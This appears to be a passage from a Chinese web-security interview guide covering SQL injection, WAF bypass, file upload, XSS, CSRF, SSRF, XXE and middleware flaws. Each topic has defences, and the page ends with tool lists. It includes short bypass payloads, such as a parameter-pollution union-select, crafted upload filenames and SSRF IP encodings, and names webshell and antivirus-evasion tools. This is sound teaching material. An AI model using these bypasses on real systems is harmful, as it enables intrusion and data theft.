<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&gt;预编译		(数据库不会将参数内容视为SQL命令执行,而是一个字段的属性值来处理,即提前编译SQL语句，将所有的用户输入都当做『数据』，而非『语法』)</span><br><span class="line">2&gt;PDO预处理	(本地和Mysql服务端使用字符集对输入进行转义)</span><br><span class="line">3&gt;正则表达式过滤(如果用户输入了非法信息则利用正则表达式过滤)</span><br></pre></td></tr></table></figure>
<h2 id="06-你在进行sql注入时，发现有waf-该怎么办？">06.你在进行sql注入时，发现有waf,该怎么办？</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&gt;大小写</span><br><span class="line">2&gt;编码绕过</span><br><span class="line">3&gt;等价函数绕过 sleep==&gt;benchmark() </span><br><span class="line">4&gt;内联注释</span><br><span class="line">5&gt;参数污染</span><br></pre></td></tr></table></figure>
<p><code>参数污染</code></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Samforrest/p/15867628.html">https://www.cnblogs.com/Samforrest/p/15867628.html</a></p>
<h3 id="简介">简介</h3>
<p>http参数污染即HPP(HTTP Parameter Pollution)，是一种注入型漏洞，攻击者通过 在HTTP请求中插入特定的参数来发起攻击。如果web应用中存在这样的漏洞可以被攻击者利用来进行客户端或服务器端的攻击。</p>
<p>在sql注入的应用则是可以达到绕过sqlwaf的目的。</p>
<h3 id="原理">原理</h3>
<p>在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次</p>
<p>但是不同服务器的处理方式会不一样。有的会被覆盖,有的则不会覆盖并且都传入参数</p>
<p>必应:</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/sanmuforrest/images/raw/master/image/1644210782.png"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/1644210782.png" alt="img"></a></p>
<p>对于同样的参数，必应会处理后一个参数</p>
<p>但是对于谷歌，会两个参数一起处理。</p>
<p>一些常见的web服务器对同样名称的参数出现多次的处理方式:</p>
<table>
<thead>
<tr>
<th style="text-align:left">Web服务器</th>
<th style="text-align:left">参数获取函数</th>
<th style="text-align:left">获取到的参数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP/Apache</td>
<td style="text-align:left">$_GET(“par”)</td>
<td style="text-align:left">Last</td>
</tr>
<tr>
<td style="text-align:left">JSP/Tomcat</td>
<td style="text-align:left">Request.getParameter(“par”)</td>
<td style="text-align:left">First</td>
</tr>
<tr>
<td style="text-align:left">Perl(CGI)/Apache</td>
<td style="text-align:left">Param(“par”)</td>
<td style="text-align:left">First</td>
</tr>
<tr>
<td style="text-align:left">Python/Apache</td>
<td style="text-align:left">getvalue(“par”)</td>
<td style="text-align:left">All(list)</td>
</tr>
<tr>
<td style="text-align:left">ASP/IIS</td>
<td style="text-align:left">Request.QueryString(“par”)</td>
<td style="text-align:left">ALL(comma-delimited string)</td>
</tr>
</tbody>
</table>
<h3 id="应用">应用</h3>
<h4 id="waf绕过">waf绕过</h4>
<p>如果waf会将union给过滤掉，那么我们可以利用HHP绕过</p>
<p>如上传的参数为在特定情况下为<code>bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3</code>如果服务器端是将获取到的参数组合的话，就可以达到绕过的目的。</p>
<p>组合起来就是<code>union select 1,user(),3</code></p>
<h2 id="07-SQL注入攻击有哪些危害？">07.SQL注入攻击有哪些危害？</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&gt;获取数据库数据</span><br><span class="line">2&gt;网页篡改</span><br><span class="line">3&gt;网页挂马</span><br><span class="line">4&gt;更改数据库数据</span><br><span class="line">5&gt;获取服务器权限</span><br></pre></td></tr></table></figure>
<h2 id="08-文件上传有了解吗？">08.文件上传有了解吗？</h2>
<h3 id="1-原理"><strong>1&gt;原理:</strong>()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web页面的文件上传功能,没有对文件名后缀进行严格限制,导致攻击者可以上传能被服务器解析并执行的文件,并通过此文件获得执行服务端命令的能力</span><br></pre></td></tr></table></figure>
<h3 id="2-利用思路"><strong>2&gt;利用思路:</strong></h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常规类:扫描获取上传,会员中心上传,后台系统上传以及各种途径上传.</span><br><span class="line">CMS类:已知CMS源码(上传.php.mod文件即主题文件.mod).</span><br><span class="line">编译器类：ckeditor、fckeditor、kindeditor、xxxxeditor。</span><br><span class="line">其他类/CVE：代码审计、平台/第三方应用。</span><br></pre></td></tr></table></figure>
<h3 id="3-危害"><strong>3&gt;危害:</strong>()</h3>
<p>上传webshell控制服务器远程命令执行,</p>
<p>上传系统病毒,木马文件进行挖矿,僵尸网络</p>
<p><strong>进行提权操作</strong></p>
<p><strong>修改web页面,实现钓鱼,挂马</strong></p>
<p><strong>进行内网渗透</strong></p>
<h3 id="4-绕过"><strong>4&gt;绕过:</strong></h3>
<p>修改前端js</p>
<p>修改mime类型</p>
<p>修改后缀名</p>
<p>后缀名大小写</p>
<p>.htaccess–apache解析文件</p>
<p>.user.ini</p>
<p>条件竞争</p>
<p><strong>图片马</strong></p>
<p><strong>GIF89A文件头欺骗</strong></p>
<p><strong>%00,0x00截断</strong></p>
<p><strong>二次渲染绕过</strong></p>
<p><strong>条件竞争绕过</strong>(将图片上传上去,才开始进行判断后缀名,二次渲染.)</p>
<p><strong>特殊可解析后缀绕过</strong>php1,php2,php3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PhP除了可以解析php后缀 还可以解析php1,php2，php3，php4 ，phtml等</span><br><span class="line">Asp可解析 	asa，cer,cdx</span><br><span class="line">Aspx可解析 ashx，asmx，ascx</span><br><span class="line">Jsp可解析 	jspx、jspf</span><br></pre></td></tr></table></figure>
<p><strong>点+空格+点绕过</strong></p>
<blockquote>
<p>某些情况下，源代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过strrchar函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过</p>
</blockquote>
<p><strong>::$DATA绕过</strong></p>
<blockquote>
<p>在php代码中没有对::$DATA进行过滤，在windows中会将文件名::$DATA之后的数据当成文件流处理，保持::$DATA之前的文件名<br>
假设上传的文件为test9.php::$DATA.jpg，如果成功上传到服务器就会去掉::$DATA.jpg变成test9.php进行保存<br>
但是php代码中还通过strrchr函数获取文件后缀.jpg，并以该后缀作为上传之后的文件后缀<br>
所以test9.php::$DATA.jpg上传到服务器后缀仍然是.jpg</p>
</blockquote>
<h3 id="5-防范"><strong>5&gt;防范:</strong>()</h3>
<ul>
<li>文件上传的目录设置为不可执行</li>
</ul>
<blockquote>
<p>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p>
</blockquote>
<ul>
<li>严格判断文件类型</li>
</ul>
<blockquote>
<p>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
</blockquote>
<ul>
<li>使用随机数修改文件名和文件路径</li>
</ul>
<blockquote>
<p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</p>
</blockquote>
<ul>
<li>单独设置文件服务器的域名</li>
</ul>
<blockquote>
<p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</p>
</blockquote>
<ul>
<li>内容检测</li>
</ul>
<blockquote>
<p>有效防范图片马和文件二次渲染</p>
</blockquote>
<ul>
<li>安全加固中间件</li>
</ul>
<blockquote>
<p>及时更新并加固中间件，可以有效避免因为中间件的漏洞而导致的文件上传漏洞，比如某些中间件以前的版本很多都具有文件解析漏洞</p>
</blockquote>
<ul>
<li>采用WAF等安全防护设备</li>
</ul>
<blockquote>
<p>采用WAF等安全防护设备可以有效的防御常见漏洞</p>
</blockquote>
<h2 id="09-XSS攻击有了解吗？">09.XSS攻击有了解吗？</h2>
<h3 id="1-有了解-原理"><strong>1&gt;有了解,原理:</strong></h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss攻击就是攻击者在web页面中插入恶意代码,而程序对于用户输入的内容未进行过滤.</span><br></pre></td></tr></table></figure>
<h3 id="2-类型"><strong>2&gt;类型:</strong>()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反射型,</span><br><span class="line">存储型,</span><br><span class="line">DOM型(Document Object Model)即文档对象模型，是HTML和XML文档的编程接口。 </span><br></pre></td></tr></table></figure>
<h3 id="3-危害-2"><strong>3&gt;危害:</strong></h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">盗取cookie,</span><br><span class="line">屏幕截屏,</span><br><span class="line">键盘记录,</span><br><span class="line">配合其他工具(Metasploit)获取服务器权限,</span><br><span class="line">重定向(植入广告,恶意链接),</span><br><span class="line">网页钓鱼(水坑攻击),</span><br><span class="line">网页挂马(可以控制对方主机)</span><br></pre></td></tr></table></figure>
<h3 id="4-防护"><strong>4&gt;防护:</strong>()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">特殊字符HTML实体转化,</span><br><span class="line">设置标签属性黑名单,</span><br><span class="line">加入httponly(防止窃取cookie)</span><br></pre></td></tr></table></figure>
<h2 id="10-CSRF-跨站请求伪造">10.CSRF(跨站请求伪造)</h2>
<h3 id="1-原理-2"><strong>1&gt;原理:</strong>()</h3>
<blockquote>
<p>利用浏览器对用户的信任进行攻击</p>
</blockquote>
<p>web应用程序在用户进行敏感操作时,入修改账户密码,添加账户等没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p>
<blockquote>
<p>受害者A登录网站，攻击者B构造有效链接诱导受害者A访问，网站在线期间会将该请求当做正常业务执行。(比如修改密码，向某用户转账等业务，当然现在这种简单的EXP基本上见不到，拿靶场验证一下用于理解原理就行了)</p>
</blockquote>
<h3 id="2-类型-2">2&gt;类型:</h3>
<ul>
<li><strong>GET类型</strong></li>
<li><strong>POST类型</strong></li>
</ul>
<blockquote>
<p>比如在一个页面中构造好一个表单表单，将这个页面隐藏在一个不可见的iframe窗口中，然后使用JavaScript自动提交这个表单，在整个过程中，对于用户来说是不可见的。当用户访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作</p>
</blockquote>
<h3 id="3-危害-3">3&gt;危害:</h3>
<ul>
<li>盗用其他用户或者管理员的账户</li>
<li>获取个人隐私或者机密资料</li>
<li>联合其他漏洞组合拳</li>
</ul>
<blockquote>
<p>比如说拿到管理员账号之后，我们在某个页面利用XSS漏洞进行网页挂马，普通用户访问后就会下载木马程序，进而联合MSF或者CS等工具getshell。再比如说你把管理员密码还原一下，真正管理员登录的时候也会受到网页挂马的影响，结合工具可以进一步拿下管理员主机权限。</p>
</blockquote>
<h3 id="4-防范措施">4&gt;防范措施</h3>
<ul>
<li><strong>验证码验证</strong></li>
</ul>
<blockquote>
<p>验证码被认为是对抗CSRF攻击最简洁而有效的防御方法。</p>
<p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，对用户执行敏感操作时进行验证，就能够很好地遏制CSRF攻击。</p>
<p>但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p>
</blockquote>
<ul>
<li><strong>在请求地址中添加 token 并验证</strong></li>
</ul>
<blockquote>
<p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。</p>
<p>要抵御 CSRF关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。</p>
<p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
</blockquote>
<ul>
<li><strong>验证 HTTP头的Referer 字段</strong></li>
</ul>
<blockquote>
<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，头信息里会包含Referer。</p>
<p><a target="_blank" rel="noopener" href="http://xn--www-lp6en1iv9r0tq.google.com">比如我在www.google.com</a> 里有一个**<code>www.baidu.com</code>** 链接，那么点击这个链接，它的头信息里就会有：</p>
<p>Referer=<a target="_blank" rel="noopener" href="http://www.google.com">http://www.google.com</a></p>
<p>通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p>
</blockquote>
<ul>
<li><strong>在 HTTP 头中自定义属性并验证</strong></li>
</ul>
<blockquote>
<p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p>
<p>缺陷是要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，就意味着可能要重写整个网站，这代价无疑是不能接受的。</p>
</blockquote>
<h2 id="11-SSRF有了解吗">11.SSRF有了解吗?</h2>
<h3 id="1-原理-3">1&gt;原理:()</h3>
<p>ssrf是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>
<h3 id="2-SSRF利用点">2&gt;SSRF利用点()</h3>
<ol>
<li>分享：通过 url 地址分享网页内容</li>
<li>转码服务：通过 url 地址把原地址的网页内容调优使其适合收集屏幕浏览</li>
<li>在线翻译：他弄个 url 地址翻译对应文本的内容，比如百度翻译，有道等</li>
<li>图片加载与下载：通过指定 url 地址加载或者下载图片</li>
<li>图片文章的收藏功能：从分享的 url 中读取原文的标题等</li>
<li>从未公开的 api 实现以及其他调用 url 的功能</li>
<li>ssrf 漏洞验证</li>
<li>ssrf 利用方式</li>
<li>本地利用</li>
<li>远程利用</li>
<li>探测内网</li>
<li>攻击 Redis 服务</li>
<li>攻击 Mysql 服务</li>
</ol>
<h3 id="3-绕过">3&gt;绕过:()</h3>
<p><strong>利用@绕过限制白名单域名</strong></p>
<p>利用@，当网站限制只能访问 <code>http://www.xxx.com</code>类型的域名时，可以采用http基本身份认证的方式绕过，如：<a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com">http://www.xxx.com@www.xxc.com</a></p>
<p><strong>绕过限制白名单内网IP</strong></p>
<ul>
<li>采用短网址绕过</li>
<li>利用特殊域名，xip.io可以指向任意域名（原理是DNS解析），即 <a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io">127.0.0.1.xip.io</a>，可以解析为127.0.0.1</li>
<li>采用进制转换，127.0.0.1 八进制：<strong><code>0177.0.0.1</code></strong>；十六进制：<strong><code>0x7f.0.0.1</code></strong>；十进制：<strong><code>2130706433</code></strong></li>
<li>利用**<code>[::]</code>，<code>http://[::]:80/</code>** 会解析为 <strong><code>http://127.0.0.1</code></strong></li>
<li>添加端口号，<a target="_blank" rel="noopener" href="http://127.0.0.1:8080">http://127.0.0.1:8080</a></li>
<li>利用句号，如**<code>127。0。0。1</code>** 会解析为 127.0.0.1</li>
<li>采用302跳转</li>
<li>特殊数字字符</li>
</ul>
<h3 id="4-危害">4&gt;危害:</h3>
<ol>
<li><strong>对外网、服务器所在内网、本地进行端口扫描</strong></li>
<li><strong>向内部任意主机的任意端口发送payload来攻击内网服务</strong></li>
<li><strong>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</strong></li>
<li><strong>攻击内网的web应用，如直接SQL注入、XSS攻击等</strong></li>
<li><strong>利用file、gopher、dict协议读取本地文件、执行命令等</strong></li>
<li><strong>可以无视网站CDN</strong></li>
</ol>
<h3 id="5-防范-2">5&gt;防范:</h3>
<ul>
<li><strong>禁止跳转</strong></li>
<li><strong>过滤返回的信息</strong></li>
</ul>
<blockquote>
<p>如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
</blockquote>
<ul>
<li><strong>统一错误信息</strong></li>
</ul>
<blockquote>
<p>避免用户可以根据错误信息来判断远程服务器的端口状态。</p>
</blockquote>
<ul>
<li><strong>限制请求的端口</strong></li>
</ul>
<blockquote>
<p>比如80,443,8080,8090。</p>
</blockquote>
<ul>
<li><strong>禁止除HTTP和HTTPS外的协议</strong></li>
</ul>
<blockquote>
<p>比如说仅仅允许http和https请求。可以防止类似于file:///,gopher://,<a href="ftp://%E8%AF%B7%E6%B1%82%E7%AD%89%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98">ftp://请求等引起的问题</a>。</p>
</blockquote>
<ul>
<li><strong>对请求地址设置白名单或者限制内网IP</strong></li>
</ul>
<h2 id="12-csrf、ssrf与xss的区别">12.csrf、ssrf与xss的区别</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss是利用用户对网站的信任进行攻击,csrf是利用浏览器对用户的信任进行攻击,这两个的攻击层面都是浏览器,ssrf是服务器对用户提供的可控URL过于信任，攻击层面是服务器</span><br></pre></td></tr></table></figure>
<p>ssrf是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>
<h2 id="13-XXE实体攻击有了解吗？">13.XXE实体攻击有了解吗？</h2>
<h3 id="1-原理-4">1&gt;原理:()</h3>
<p>XML 文件在引用外部实体时候，可以沟通构造恶意内容，可以导致读取任意文件，命令执行和对内网的攻击</p>
<h3 id="2-XXE构建">2&gt;XXE构建:</h3>
<p><strong>直接通过DTD外部实体声明</strong><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/e1139fcade4e46e80e31223c9799998b.png" alt="img"></p>
<p><strong>通过DTD文档引入外部DTD文档，再引入外部实体声明</strong><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/4471890a133435ef40590514a1da4646.png" alt="img"></p>
<p><strong>通过DTD外部实体声明引入外部实体声明<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/bb4d962f5da7ce09d3a269f0a37c6965.png" alt="img"></strong></p>
<h3 id="3-危害-4">3&gt;危害:</h3>
<ol>
<li>任意文件读取</li>
<li>系统命令执行</li>
<li>执行远程代码</li>
<li><strong>探测内网端口</strong></li>
<li><strong>攻击内部网络</strong></li>
<li><strong>DOS拒绝服务攻击</strong></li>
<li><strong>钓鱼</strong></li>
</ol>
<h3 id="4-防范">4&gt;防范:</h3>
<p><strong>禁止使用DTD的外部声明；</strong></p>
<p>比如PHP语言中使用libxml_disable_entity_loader(true);等方式。</p>
<p>Python语言中使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
<p>**对用户提交过来的XML数据进行过滤。**过滤如SYSTEM等敏感关键字，防止非正常、攻击性的外部实体引入操作。</p>
<h2 id="14-常见的中间件漏洞有哪些？">14.常见的中间件漏洞有哪些？</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   1&gt;IIS6.0版本</span><br><span class="line"><span class="code">        （1） 当建立.asa、.asp格式的文件夹时，其目录下的任意文件都将被IIS当作为asp文件解析。</span></span><br><span class="line"><span class="code">        （2） 当上传文件.asp;*.jpg IIS6.0会将文件当做asp文件解析。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">  	2&gt;apache</span><br><span class="line">  	(1)低版本（2.x）</span><br><span class="line"><span class="code">        如果对方中间件是apache属于低版本，我们可以利用文件上传，上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，其中的后门代码被执行。例如：x.php.aaa.bbb.ccc.ddd,可以被当作php文件进行解析，从最后一个.ddd开始，apache不认识，就往前走,一直到.php，这样即绕过了验证，有可以进行解析。</span></span><br><span class="line"><span class="code">(2)apach换行解析漏洞（2.4.0--2.4.29)</span></span><br><span class="line"><span class="code">	在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</span></span><br><span class="line"><span class="code">   3&gt;Nginx</span></span><br><span class="line"><span class="code">   (1)低版本、II7</span></span><br><span class="line"><span class="code">       上传可以上传的文件，在文件地址后加上/x.php，可以让文件以php代码去执行。</span></span><br><span class="line"><span class="code">   (2)文件名逻辑（0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</span></span><br><span class="line"><span class="code">   	我们只需要上传一个空格结尾的文件，即可使PHP解析&quot;.php &quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="15-了解过WAF吗？">15.了解过WAF吗？</h2>
<h3 id="概念">概念:</h3>
<p>Web应用防火墙,简称WAF,是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一种产品,一般部署在Web服务器之前,用来保护web应用.</p>
<h3 id="主要功能">主要功能:</h3>
<blockquote>
<p>WAF主要是通过内置的很多安全规则来进行防御.</p>
<p>可防护常见的SQL注入,XSS,网页篡改,中间件漏洞等OWASP TOP10攻击行</p>
<p>具有威胁感知能力,当发现攻击后,可将IP进行锁定,IP锁定之后将无法访问网站业务</p>
<p>也支持防止CC攻击,采用集中度和速率双重检测算法</p>
</blockquote>
<h3 id="不具备的功能">不具备的功能:</h3>
<p><strong>(给你加深一下影响，防止你想不起来就乱猜)</strong></p>
<blockquote>
<ul>
<li>WAF不能过滤其他协议流量，如FTP、PoP3协议</li>
<li>WAF不能实现传统防护墙功能，如地址映射</li>
<li>WAF不能防止网络层的DDoS攻击</li>
<li>WAF不能防病毒</li>
</ul>
</blockquote>
<h2 id="16-绕过WAF的姿势？">16.绕过WAF的姿势？</h2>
<ul>
<li>通配符?*</li>
<li>大小写变种</li>
<li>内联注释/**/</li>
<li>干扰字符污染法</li>
<li>字符编码法</li>
<li>双写,嵌套,拼凑法</li>
<li>多请求拆分绕过</li>
<li>利用cookie绕过</li>
<li>利用溢量数据绕过WAF</li>
<li>云WAF绕过之寻找网站源ip</li>
</ul>
<h2 id="17-你在渗透测试中常用的工具？">17.你在渗透测试中常用的工具？</h2>
<p>Burp Suite	Nmap	站长工具	子域名挖掘机	Wireshark	proxifier	御剑	AWVS	X-ray	dirsearch	fastcoll	xray_windows_amd64.exe	Sqlmap	Hackerbar	BlueLotus_XSSReceiver	冰蝎	哥斯拉	蚁剑</p>
<h3 id="信息收集">信息收集</h3>
<blockquote>
<p><strong>Nmap，Fofa，Shodan，zoomeye，站长工具，Bugscaner，潮汐指纹，云悉指纹，Censys，whatweb，WTFScan，子域名挖掘机，dnsdist6，WAFw00f，Fping，arping，nping，nbtscan，whois，Layer子域名收集工具，JSFinder，wwwscan等</strong></p>
</blockquote>
<p>Nmap	站长工具	子域名挖掘机</p>
<h3 id="抓包分析">抓包分析</h3>
<blockquote>
<p><strong>Burp Suite,Wireshark, TrafficTools，fiddler，hack firefox，proxifier，shadowsocks等</strong></p>
</blockquote>
<p>Burp Suite	Wireshark	proxifier</p>
<h3 id="端口扫描-2">端口扫描</h3>
<blockquote>
<p><strong>Nmap，Zenmap，Masscan，御剑端口扫描工具,Hping3，Advanced_Port_Scanner，PortScan ,netscan tools,blackwater,Unicornscan,nast,Knocker,IPscan等</strong></p>
</blockquote>
<p>Nmap	御剑</p>
<h3 id="漏洞扫描">漏洞扫描</h3>
<blockquote>
<p><strong>Nessus，AWVS，X-ray，Appscan，W3af，OpenVAS，Skipfish，lynis，WPscan，Comodo HackerProof，Nexpose community，Vulnerability Manager Plus，Nikto等</strong></p>
</blockquote>
<p>AWVS	X-ray</p>
<h3 id="目录扫描或爆破">目录扫描或爆破</h3>
<blockquote>
<p><strong>Dirbuster，御剑目录爆破工具，dirsearch，dirb，ffuf，Dirmap，cansin，Wscan，</strong></p>
<p>webdirscan，SourceLeakHacker，fuff等</p>
</blockquote>
<p>御剑	dirsearch</p>
<h3 id="暴力破解">暴力破解</h3>
<blockquote>
<p><strong>Burp Suite，Hydra，cupp，crunch，Aircrack-NG(无线密码破解)，John the Ripper，Rainbow Crack，Cain &amp; Able，L0phtcrack， Ophcrack，Crack，Hashcat，SAMInside，DaveGrohl(Mac os  x) ，Ncrack，Brutus，Wfuzz，Medusa等</strong></p>
</blockquote>
<p>Burp Suite	fastcoll	xray_windows_amd64.exe</p>
<h3 id="SQL注入漏洞扫描或利用">SQL注入漏洞扫描或利用</h3>
<blockquote>
<p><strong>Sqlmap，SQLiScanner，DSSS，Jsql-injection，nosqlattack,Safe3 SQL Injector</strong>,</p>
<p><strong>啊D注入</strong>,<strong>BSQL Hacker,The Mole,Pangolin,Havij,Enema SQLi,sqlsus,SQL Poizon，Netsparker，Leviathan，NoSQLMap，Tyrant SQL，Whitewidow等</strong></p>
</blockquote>
<p>Sqlmap	Hackerbar</p>
<h3 id="XSS漏洞利用">XSS漏洞利用</h3>
<blockquote>
<p><strong>Cobalt Strike，Beef，XSSer，XSpear，TamperIE，BlueLotus_XSSReceiver(XSS利用平台)，XSSYA，xssfork，xssScanner，XSSCon，BruteXSS，XDT等</strong></p>
</blockquote>
<p>BlueLotus_XSSReceiver</p>
<h3 id="WebShell利用">WebShell利用</h3>
<blockquote>
<p><strong>冰蝎，哥斯拉，蚁剑，中国菜刀，天蝎(skyscorpion), pyshell，w8ay，WebKnife，XISE，K8飞刀，Altman，Hatchet，AspxClient(仅支持ASPX脚本)，C刀（Cknife），QuasiBot，Weevely，WeBaCoo， Webhandler，Webshell-Sniper，PhpSploit，SharPyShell等</strong></p>
</blockquote>
<p>冰蝎	哥斯拉	蚁剑</p>
<h3 id="免杀">免杀</h3>
<blockquote>
<p>**Shellter，FourEye，crazyKiller，DKMC，avevasion，charlotte，cool，crossnet，darkarmour，shellcodeloader，vmprotect，vprotect，ZheTian，peidtool，Mimikatz，PrintSpoofer，metasploit，Veil，avet ，Green hat pro，Venom ，**<strong>TheFatRat，Insanity等</strong></p>
</blockquote>
<h3 id="综合">综合</h3>
<blockquote>
<p><strong>Metasploit，GUI_Tools，Hijacker(针对Android)，AttackSurfaceMapper，Burp Suite，watchdog，Empire等</strong></p>
</blockquote>
<p>Burp Suite</p>
<h2 id="18-使用过哪些安全设备？">18.使用过哪些安全设备？</h2>
<p>火绒	腾讯安全管家	360杀毒	金山毒霸</p>
<p>宝塔</p>
<p>火绒剑</p>
<p><strong>webshell查杀</strong></p>
<blockquote>
<p><strong>D盾_Web查杀，百度WEBDIR+(在线)，河马(全平台，CloudWalker(牧云)(全平台)，Web Shell Detector(在线)，Sangfor WebShellKill(深信服)，深度学习模型检测PHP Webshell(在线)，PHP Malware Finder webshell(全平台)，findWebshell，Webshell.pub专注查杀(在线)等</strong></p>
</blockquote>
<p><strong>病毒查杀</strong></p>
<blockquote>
<p><strong>火绒，腾讯安全管家，360杀毒，Rkhunter，卡巴斯基，金山毒霸，瑞星杀毒软件，大蜘蛛，深信服EDR，Rootkit，NOD32，Clamav，virustotal等</strong></p>
</blockquote>
<p>火绒	腾讯安全管家	360杀毒	金山毒霸</p>
<p><strong>安全防护</strong></p>
<blockquote>
<p><strong>网站安全狗，创宇盾，云锁，阿里云WAF,HiHTTPS，ModSecurity，Naxsi,OpenWAF,FreeWAF，ESAPI WAF，unixhot，Java WAF，X-WAF，VeryNginx，COMODO Firewall等</strong></p>
</blockquote>
<p>宝塔</p>
